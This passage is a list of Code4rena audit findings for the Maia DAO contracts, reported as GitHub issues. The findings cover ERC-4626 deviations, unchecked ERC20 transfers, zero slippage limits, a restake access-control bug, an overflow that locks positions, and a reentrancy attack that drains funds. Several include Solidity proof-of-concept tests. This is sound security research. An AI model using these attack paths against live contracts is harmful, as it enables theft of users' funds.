"https://github.com/code-423n4/2023-05-maia-findings/issues/586", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-10"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "## vMaia is an ERC-4626 compliant but maxWithdraw & maxRedeem functions are not fully up to EIP-4626's specification", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/585", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-16"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/maia/tokens/ERC4626PartnerManager.sol#L174   # Vulnerability details  ## vMaia is an ERC-4626 compliant but maxWithdraw & maxRedeem functions are not fully up to EIP-4626's specification  maxWithdraw & maxRedeem functions should return the 0 during withdrawal is paused. But here it's returning balanceOf[user].  ## Proof of Concept  vMaia Withdrawal is only allowed once per month during the 1st Tuesday (UTC+0) of the month.  It's  checked by the below function.       102       function beforeWithdraw(uint256, uint256) internal override {                 /// @dev Check if unstake period has not ended yet, continue if it is the case.                 if (unstakePeriodEnd >= block.timestamp) return;                          uint256 _currentMonth = DateTimeLib.getMonth(block.timestamp);                 if (_currentMonth == currentMonth) revert UnstakePeriodNotLive();                          (bool isTuesday, uint256 _unstakePeriodStart) = DateTimeLib.isTuesday(block.timestamp);                 if (!isTuesday) revert UnstakePeriodNotLive();                          currentMonth = _currentMonth;                 unstakePeriodEnd = _unstakePeriodStart + 1 days;     114        }  https://github.com/code-423n4/2023-05-maia/blob/main/src/maia/vMaia.sol#L102C1-L114C6       173            function maxWithdraw(address user) public view virtual override returns (uint256) {                       return balanceOf[user];                   }                                  /// @notice Returns the maximum amount of assets that can be redeemed by a user.                   /// @dev Assumes that the user has already forfeited all utility tokens.                   function maxRedeem(address user) public view virtual override returns (uint256) {                       return balanceOf[user];     181              }   https://github.com/code-423n4/2023-05-maia/blob/main/src/maia/tokens/ERC4626PartnerManager.sol#L173C3-L181C6  Other than that period (during the 1st Tuesday (UTC+0) of the month ), maxWithdraw & maxRedeem functions should return the 0 According to EIP-4626 specifications.  maxWithdraw       MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST      return 0.  maxRedeem       MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST      return 0.  https://eips.ethereum.org/EIPS/eip-4626  ## Tools Used Manual Auditing  ## Recommended Mitigation Steps  Use if-else block & if the time period is within the 1st Tuesday (UTC+0) of the month return balanceOf[user] & else return 0.  For more information: https://blog.openzeppelin.com/pods-finance-ethereum-volatility-vault-audit-2#non-standard-erc-4626-vault-functionality    ## Assessed type  ERC4626"}, {"title": "Protocol fees can become trapped indefinitely inside Talos vault contracts", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/583", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-17"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L394-L415   # Vulnerability details  ## Impact  Talos strategy contracts all inherit logic from `TalosBaseStrategy`, including the function `collectProtocolFees`. This function is used by the owner to receive fees earned by the contract.  Talos vault contracts should be expected to work properly for any token that has a sufficiently liquid Uniswap pool. However certain ERC20 tokens [do not revert on failed transfer](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#SafeERC20), and instead return `false`. In `TalosBaseStrategy#collectProtocolFees`, tokens are transferred from the contract to the owner using `transfer`, and the return value is not checked. This means that the transfer could fail silently, in which case `protocolFees0` and `protocolFees1` would be updated without the tokens leaving the contract. This function is inherited by any Talos vault contract.  This accounting discrepancy causes the tokens to be irretrievably trapped in the contract.  ## Proof of Concept  ```solidity     function collectProtocolFees(uint256 amount0, uint256 amount1) external nonReentrant onlyOwner {         uint256 _protocolFees0 = protocolFees0;         uint256 _protocolFees1 = protocolFees1;          if (amount0 > _protocolFees0) {             revert Token0AmountIsBiggerThanProtocolFees();         }         if (amount1 > _protocolFees1) {             revert Token1AmountIsBiggerThanProtocolFees();         }         ERC20 _token0 = token0;         ERC20 _token1 = token1;         uint256 balance0 = _token0.balanceOf(address(this));         uint256 balance1 = _token1.balanceOf(address(this));         require(balance0 >= amount0 && balance1 >= amount1);         if (amount0 > 0) _token0.transfer(msg.sender, amount0); // @audit should use `safeTransfer`         if (amount1 > 0) _token1.transfer(msg.sender, amount1); // @audit should use `safeTransfer`          protocolFees0 = _protocolFees0 - amount0;         protocolFees1 = _protocolFees1 - amount1;         emit RewardPaid(msg.sender, amount0, amount1);     } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L394-L415  ## Tools Used Manual review  ## Recommended Mitigation Steps Use [OpenZeppelin's SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) library for ERC20 transfers.   ## Assessed type  ERC20"}, {"title": "Lack of slippage protection can lead to significant loss of user funds", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/577", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-18"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L201-L210 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/libraries/PoolActions.sol#L73-L87 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L135-L149 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L353-L361   # Vulnerability details  Talos strategy contracts interact with Uniswap V3 in multiple areas of the code. However none of these interactions contain any [slippage control](https://dacian.me/defi-slippage-attacks#heading-no-slippage-parameter), meaning that the contract, and by extension all users who hold shares, can lose significant value due to illiquid pools or MEV sandwich attacks every time any of the relevant functions are called.  ## Impact [`TalosBaseStrategy#deposit`](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L201-L210) is the entry point for any Talos vault, and transfers tokens from the caller to the vault to be deposited into Uniswap V3. Since it lacks slippage control, every user who interacts with any Talos vault will risk having their funds stolen by MEV bots. [`PoolActions#rerange`](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/libraries/PoolActions.sol#L73-L87) is also vulnerable (which is called whenever the strategy manager wishes to rebalance pool allocation of the vault) which may lead to vault funds being at risk to the detriment of shareholders. The vault initialize function [`TalosBaseStrategy#init`](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L135-L149) is vulnerable as well however only the vault owners funds would be at risk here.  ## Proof of Concept In each of the below instances, a call to Uniswap V3 is made and `amount0Min` and `amount1Min` are each set to 0, which allows for **100% slippage tolerance**. This means that the action could lead to the caller losing up to 100% of their tokens due to slippage.  [`TalosBaseStrategy#deposit`](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L201-L210): ```solidity         (liquidityDifference, amount0, amount1) = nonfungiblePositionManager.increaseLiquidity(             INonfungiblePositionManager.IncreaseLiquidityParams({                 tokenId: _tokenId,                 amount0Desired: amount0Desired,                 amount1Desired: amount1Desired,                 amount0Min: 0, // @audit should be non-zero                 amount1Min: 0, // @audit should be non-zero                 deadline: block.timestamp             })         ); ```  [`PoolActions#rerange`](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/libraries/PoolActions.sol#L73-L87): ```solidity         (tokenId, liquidity, amount0, amount1) = nonfungiblePositionManager.mint(             INonfungiblePositionManager.MintParams({                 token0: address(actionParams.token0),                 token1: address(actionParams.token1),                 fee: poolFee,                 tickLower: tickLower,                 tickUpper: tickUpper,                 amount0Desired: balance0,                 amount1Desired: balance1,                 amount0Min: 0, // @audit should be non-zero                 amount1Min: 0, // @audit should be non-zero                 recipient: address(this),                 deadline: block.timestamp             }) ```  [`TalosBaseStrategy#init`](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L135-L149): ```solidity         (_tokenId, _liquidity, amount0, amount1) = _nonfungiblePositionManager.mint(             INonfungiblePositionManager.MintParams({                 token0: address(_token0),                 token1: address(_token1),                 fee: poolFee,                 tickLower: tickLower,                 tickUpper: tickUpper,                 amount0Desired: amount0Desired,                 amount1Desired: amount1Desired,                 amount0Min: 0, // @audit should be non-zero                 amount1Min: 0, // @audit should be non-zero                 recipient: address(this),                 deadline: block.timestamp             })         ); ```  [`TalosBaseStrategy#_withdrawAll`](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L353-L361): ```solidity         _nonfungiblePositionManager.decreaseLiquidity(             INonfungiblePositionManager.DecreaseLiquidityParams({                 tokenId: _tokenId,                 liquidity: _liquidity,                 amount0Min: 0, // @audit should be non-zero                 amount1Min: 0, // @audit should be non-zero                 deadline: block.timestamp             })         ); ```  ## Tools Used Manual review  ## Recommended Mitigation Steps For each vulnerable function, allow the caller to specify values for `amount0Min` and `amount1Min` instead of setting them to 0.   ## Assessed type  Uniswap"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/560", "labels": ["grade-a", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-12"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/ABA-Analysis.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/558", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-16"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Rolezn-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/551", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-11"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Rolezn-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/549", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-17"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/IllIllI-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/548", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-12"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/IllIllI-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/547", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Kamil-Chmielewski-Analysis.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/544", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-18"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Rageur-G.md)."}, {"title": "RestakeToken function is not permissionless", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/534", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-19"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/uni-v3-staker/UniswapV3Staker.sol#L340-L348 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/uni-v3-staker/UniswapV3Staker.sol#L373-L374   # Vulnerability details  One of the project assumptions is that anyone can call the `restakeToken` function on someone else's token after the incentive ends (at the start of the new gauge cycle).   ```solidity File: src/uni-v3-staker/UniswapV3Staker.sol 365:     function _unstakeToken(IncentiveKey memory key, uint256 tokenId, bool isNotRestake) private { 366:         Deposit storage deposit = deposits[tokenId]; 367:  368:         (uint96 endTime, uint256 stakedDuration) = 369:             IncentiveTime.getEndAndDuration(key.startTime, deposit.stakedTimestamp, block.timestamp); 370:  371:         address owner = deposit.owner; 372:  373: @>      // anyone can call restakeToken if the block time is after the end time of the incentive 374: @>      if ((isNotRestake || block.timestamp < endTime) && owner != msg.sender) revert NotCalledByOwner();      ... ```  This assumption is broken because everywhere the `_unstakeToken` is called, the `isNotRestake` flag is set to `true`, including the [`restakeToken`](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/uni-v3-staker/UniswapV3Staker.sol#L342) function. Because of that, when the caller is not the `deposit.owner`, the `if` block will evaluate to `true`, and the call will revert with `NotCalledByOwner()` error.  ```solidity File: src/uni-v3-staker/UniswapV3Staker.sol 340:     function restakeToken(uint256 tokenId) external { 341:         IncentiveKey storage incentiveId = stakedIncentiveKey[tokenId]; 342: @>      if (incentiveId.startTime != 0) _unstakeToken(incentiveId, tokenId, true); 343:  344:         (IUniswapV3Pool pool, int24 tickLower, int24 tickUpper, uint128 liquidity) = 345:             NFTPositionInfo.getPositionInfo(factory, nonfungiblePositionManager, tokenId); 346:  347:         _stakeToken(tokenId, pool, tickLower, tickUpper, liquidity); 348:     } ```  ## Impact  *Lower yield for users, broken 3rd party integration, higher gas usage*  The purpose of the `restakeToken` function is to:  - Enable easier automation - re-staking without the need for manual intervention  - And aggregation - combining multiple actions into a single operation to increase efficiency and reduce transaction costs.   This is also the reason why the `UniswapV3Staker` contract inherits from `Multicallable`.  Without the ability to re-stake for someone else, 3rd parties or groups of users won't be able to perform cost and yield efficient batch re-stakes.   As stated in the [Liquidity Mining section](https://v2-docs.maiadao.io/protocols/Hermes/overview/gauges/uni-v3#liquidity-mining) in the docs - LPs will lose new rewards until they re-stake again. Any delay means fewer rewards -> fewer `bHermes` utility tokens -> lower impact in the ecosystem. It is very unlikely that users will be able to re-stake exactly at 12:00 UTC every Thursday (to maximise yield) without some automation/aggregation.  ## Proof of Concept  Since I decided to create a fork test on Arbitrum mainnet, the setup is quite lengthy and is explained in great detail in the following [GitHub Gist](https://gist.github.com/ChmielewskiKamil/8261acbbed37b84d176938aa398f19bd).  Pre-conditions: - Alice and Bob are users of the protocol. They both have the 1000 DAI / 1000 USDC UniswapV3 Liquidity position minted.  - The UniswapV3Gauge has weight allocated to it.  - The BaseV2Minter has queued HERMES rewards for the cycle.  - Charlie is a 3rd party that agreed to re-stake Alice's token at the start of the next cycle (current incentive end time)  ```solidity function testRestake_RestakeIsNotPermissionless() public {         vm.startPrank(ALICE);         // 1.a Alice stakes her NFT (at incentive StartTime)         nonfungiblePositionManager.safeTransferFrom(ALICE, address(uniswapV3Staker), tokenIdAlice);         vm.stopPrank();          vm.startPrank(BOB);         // 1.b Bob stakes his NFT (at incentive StartTime)         nonfungiblePositionManager.safeTransferFrom(BOB, address(uniswapV3Staker), tokenIdBob);         vm.stopPrank();          vm.warp(block.timestamp + 1 weeks); // 2.a Warp to incentive end time         gauge.newEpoch();                   // 2.b Queue minter rewards for the next cycle          vm.startPrank(BOB);         uniswapV3Staker.restakeToken(tokenIdBob); // 3.a Bob can restake his own token         vm.stopPrank();          vm.startPrank(CHARLIE);         vm.expectRevert(bytes4(keccak256(\"NotCalledByOwner()\"))); @>issue uniswapV3Staker.restakeToken(tokenIdAlice); // 3.b Charlie cannot restake Alice's token         vm.stopPrank();          uint256 rewardsBob = uniswapV3Staker.rewards(BOB);         uint256 rewardsAlice = uniswapV3Staker.rewards(ALICE);          assertNotEq(rewardsBob, 0, \"Bob should have rewards\");         assertEq(rewardsAlice, 0, \"Alice should not have rewards\");          console.log(\"=================\");         console.log(\"Bob's rewards   : %s\", rewardsBob);         console.log(\"Alice's rewards : %s\", rewardsAlice);         console.log(\"=================\");     } ```  When used with `multicall` as it probably would in a real-life scenario, it won't work either.   Change Charlie's part to:  ```solidity bytes memory functionCall1 = abi.encodeWithSignature(  \"restakeToken(uint256)\",  tokenIdAlice ); bytes memory functionCall2 = abi.encodeWithSignature(  \"restakeToken(uint256)\",  tokenIdBob );  bytes[] memory data = new bytes[](2); data[0] = functionCall1; data[1] = functionCall2;  vm.startPrank(CHARLIE); address(uniswapV3Staker).call(abi.encodeWithSignature(\"multicall(bytes[])\", data)); vm.stopPrank(); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  A simple fix is to change the `isNotRestake` flag inside the `restakeToken` function to `false`:  ```diff diff --git a/src/uni-v3-staker/UniswapV3Staker.sol b/src/uni-v3-staker/UniswapV3Staker.sol index 5970379..d7add32 100644 --- a/src/uni-v3-staker/UniswapV3Staker.sol +++ b/src/uni-v3-staker/UniswapV3Staker.sol @@ -339,7 +339,7 @@ contract UniswapV3Staker is IUniswapV3Staker, Multicallable {        function restakeToken(uint256 tokenId) external {          IncentiveKey storage incentiveId = stakedIncentiveKey[tokenId]; -        if (incentiveId.startTime != 0) _unstakeToken(incentiveId, tokenId, true); +        if (incentiveId.startTime != 0) _unstakeToken(incentiveId, tokenId, false);            (IUniswapV3Pool pool, int24 tickLower, int24 tickUpper, uint128 liquidity) =              NFTPositionInfo.getPositionInfo(factory, nonfungiblePositionManager, tokenId); ```  A more complicated fix, which would reduce code complexity in the future, would be to rename the `isNotRestake` flag to `isRestake`.  This way, one level of indirection would be reduced.  ```diff diff --git a/src/uni-v3-staker/UniswapV3Staker.sol b/src/uni-v3-staker/UniswapV3Staker.sol index 5970379..43ff24c 100644 --- a/src/uni-v3-staker/UniswapV3Staker.sol +++ b/src/uni-v3-staker/UniswapV3Staker.sol @@ -354,15 +354,15 @@ contract UniswapV3Staker is IUniswapV3Staker, Multicallable {      /// @inheritdoc IUniswapV3Staker      function unstakeToken(uint256 tokenId) external {          IncentiveKey storage incentiveId = stakedIncentiveKey[tokenId]; -        if (incentiveId.startTime != 0) _unstakeToken(incentiveId, tokenId, true); +        if (incentiveId.startTime != 0) _unstakeToken(incentiveId, tokenId, false);      }        /// @inheritdoc IUniswapV3Staker      function unstakeToken(IncentiveKey memory key, uint256 tokenId) external { -        _unstakeToken(key, tokenId, true); +        _unstakeToken(key, tokenId, false);      }   -    function _unstakeToken(IncentiveKey memory key, uint256 tokenId, bool isNotRestake) private { +    function _unstakeToken(IncentiveKey memory key, uint256 tokenId, bool isRestake) private {          Deposit storage deposit = deposits[tokenId];            (uint96 endTime, uint256 stakedDuration) = @@ -371,7 +371,7 @@ contract UniswapV3Staker is IUniswapV3Staker, Multicallable {          address owner = deposit.owner;            // anyone can call restakeToken if the block time is after the end time of the incentive -        if ((isNotRestake || block.timestamp < endTime) && owner != msg.sender) revert NotCalledByOwner(); +        if ((isRestake || block.timestamp < endTime) && owner != msg.sender) revert NotCalledByOwner(); ```   ## Assessed type  Access Control"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/531", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-13"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/ihtishamsudo-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/520", "labels": ["grade-a", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/marcKn-Analysis.md)."}, {"title": "Second per liquidity inside could overflow `uint256` causing the LP position to be locked in UniswapV3Staker", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/505", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-17"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/uni-v3-staker/libraries/RewardMath.sol#L29   # Vulnerability details  ## Impact  `UniswapV3Staker` depends on the second per liquidity inside values from the Uniswap V3 Pool to calculate the amount of reward a position should receive. This value represents the amount of second liquidity inside a tick range that is \"active\" (`tickLower < currentTick < tickUpper`). The second per liquidity inside a specific tick range is supposed to always increase over time.  In the `RewardMath` library, the seconds inside are calculated by taking the current timestamp value and subtracting the value at the moment the position is staked. Since this value increases over time, it should be normal. Additionally, this implementation is similar to [Uniswap Team's implementation](https://github.com/Uniswap/v3-staker/blob/4328b957701de8bed83689aa22c32eda7928d5ab/contracts/libraries/RewardMath.sol#L35).  ```solidity function computeBoostedSecondsInsideX128(     uint256 stakedDuration,     uint128 liquidity,     uint128 boostAmount,     uint128 boostTotalSupply,     uint160 secondsPerLiquidityInsideInitialX128,     uint160 secondsPerLiquidityInsideX128 ) internal pure returns (uint160 boostedSecondsInsideX128) {     // this operation is safe, as the difference cannot be greater than 1/stake.liquidity     uint160 secondsInsideX128 = (secondsPerLiquidityInsideX128 - secondsPerLiquidityInsideInitialX128) * liquidity;     // @audit secondPerLiquidityInsideX128 could smaller than secondsPerLiquidityInsideInitialX128     ... } ```  However, even though the second per liquidity inside value increases over time, it could overflow `uint256`, resulting in the calculation reverting. When `computeBoostedSecondsInsideX128()` reverts, function `_unstake()` will also revert, locking the LP position in the contract forever.   ## Proof of Concept Consider the value of the second per liquidity in three different timestamps: `t1 < t2 < t3` ```solidity secondPerLiquidity_t1 = -10 = 2**256-10 secondPerLiquidity_t2 = 100 secondPerLiquidity_t3 = 300 ```  As we can see, its value always increases over time, but the initial value could be smaller than 0. When calculating `computeBoostedSecondsInsideX128()` for a period from `t1 -> t2`, it will revert.  Additionally, as I mentioned earlier, this implementation is similar to the one from Uniswap team. However, please note that Uniswap team used Solidity 0.7, which won't revert on overflow and the formula works as expected while Maia uses Solidity 0.8.  For more information on how a tick is initialized, please refer to [this code](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/Tick.sol#L132-L142) ```solidity if (liquidityGrossBefore == 0) {     // by convention, we assume that all growth before a tick was initialized happened _below_ the tick     if (tick <= tickCurrent) {         info.feeGrowthOutside0X128 = feeGrowthGlobal0X128;         info.feeGrowthOutside1X128 = feeGrowthGlobal1X128;         info.secondsPerLiquidityOutsideX128 = secondsPerLiquidityCumulativeX128;         info.tickCumulativeOutside = tickCumulative;         info.secondsOutside = time;     }     info.initialized = true; } ```  The second per liquidity inside a range that has `tickLower < currentTick < tickUpper` is [calculated as](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L221): ```solidity secondsPerLiquidityCumulativeX128 - tickLower.secondsPerLiquidityOutsideX128 - tickUpper.secondsPerLiquidityOutsideX128  // If lower tick is just init, // Then: secondsPerLiquidityCumulativeX128 = tickLower.secondsPerLiquidityOutsideX128 // And: tickUpper.secondsPerLiquidityOutsideX128 != 0 // => Result will be overflow ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps Consider using `unchecked` block to calculate this value.    ## Assessed type  Under/Overflow"}, {"title": "[M-01] Some functions in Talos contracts does not allow user to supply slippage and deadline, which may cause swap revert", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/504", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-20"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L269 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/TalosStrategyVanilla.sol#L148 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L147 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L208 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L359   # Vulnerability details  ## Impact In the following functions except `TalosBaseStrategy.redeem()`, the minimum slippage is still hardcoded to 0, not allowing user to specify their own slippage parameters. This can expose users to sandwich attacks due to unlimited slippage.  Additionally, it also does not allow users to supply their own deadline as the `deadline` parameter is simply passed in as current `block.timestamp` in which transaction occurs. This effectively means that transaction has no deadline, which means that swap transaction may be included anytime by validators and remain pending in mempool, potentially exposing users to sandwich attacks by attackers or MEV bots.   - `TalosBaseStrategy.redeem()` [Link](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L269) - `TalosStrategyVanilla._compoundFees()` [Link](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/TalosStrategyVanilla.sol#L148) - `TalosBaseStrategy.init()` [Link](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L147) - `TaloseBaseStrategy.deposit()` [Link](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L208) - `TaloseBaseStrategy._withdrawAll()` [Link](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/base/TalosBaseStrategy.sol#L359)  ## Proof of Concept  Consider the following scenario: 1. Alice wants to swap 30 BNB token for 1 BNB and later sell the 1 BNB for 300 DAI. She signs the transaction calling `TalosBaseStrategy.redeem()` with inputAmount = 30 vBNB and `amountOutmin` = 0.99 BNB (1$ slippage).  <br/>  2. The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for validators to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.  <br/>  3. When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of BNB could have drastically decreased. She will still at least get 0.99 BNB due to `amountOutmin`, but the DAI value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.  An even worse way this issue can be maliciously exploited is through MEV:  1. The swap transaction is still pending in the mempool. Average fees are still too high for validators to be interested in it. The price of BNB has gone up significantly since the transaction was signed, meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her `minOutput` value is outdated and would allow for significant slippage.  <br/>  2. A MEV bot detects the pending transaction. Since the outdated `minOut` now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.  The above scenario could be made worst for other functions where slippage is not allowed to be user-specified, where combined with a lack of deadline check, MEV bots can simply immediately sandwich users.  ## Tools Used Manual Analysis  ## Recommendation Allow users to supply their own slippage and deadline parameter within the stated functions. The deadline modifier can than can be checked via a modifier or check, which has already been implemented via the `checkDeadline()` modifier.         ## Assessed type  Timing"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/494", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-14"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/kodyvim-Analysis.md)."}, {"title": "Reentrancy attack possible on `RootBridgeAgent.retrySettlement()` with missing access control for `RootBridgeAgentFactory.createBridgeAgent()`", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/492", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-18"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L244 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/factories/RootBridgeAgentFactory.sol#L75   # Vulnerability details   `RootBridgeAgent.retrySettlement()` is lacking a `lock` modifier to prevent reentrancy. And `RootBridgeAgentFactory.createBridgeAgent()` is missing access control. Both issues combined allows anyone to re-enter `retrySettlement()` and trigger the same settlement repeatedly.   ## Impact An attacker can steal funds from the protocol by executing the same settlement multiple times before it is marked as executed.  ## Detailed Explanation ### Issue #1  In `RootBridgeAgentFactory`, the privileged function `createBridgeAgent()` is lacking access control, which allows anyone to deploy a new `RootBridgeAgent`. Leveraging that, the attacker can inject malicious RootRouter and BranchRouter that can be used to trigger a reentrancy attack in `retrySettlement()`. Injection of the malicious BranchRouter is done with a separate call to `CoreRootRouter.addBranchToBridgeAgent()` in [CoreRootRouter.sol#L81-L116](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/CoreRootRouter.sol#L81-L116), refer to POC for actual steps.  ```Solidity     function createBridgeAgent(address _newRootRouterAddress) external returns (address newBridgeAgent) {         newBridgeAgent = address(             DeployRootBridgeAgent.deploy(                 wrappedNativeToken,                 rootChainId,                 daoAddress,                 localAnyCallAddress,                 localAnyCallExecutorAddress,                 rootPortAddress,                 _newRootRouterAddress             )         );          IRootPort(rootPortAddress).addBridgeAgent(msg.sender, newBridgeAgent);     } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/factories/RootBridgeAgentFactory.sol#L75C1-L89C6   ### Issue #2 In `RootBridgeAgent`, the `retrySettlement()` function is not protected from reentrancy with the `lock` modifier. We can then re-enter this function via the injected malicious BranchRouter (Issue #1). The malicious BranchRouter can be triggered via `BranchBridgeAgentExecutor` when the attacker perform the settlement call. That  will execute `IRouter(_router).anyExecuteSettlement()` when additional calldata is passed in as shown in 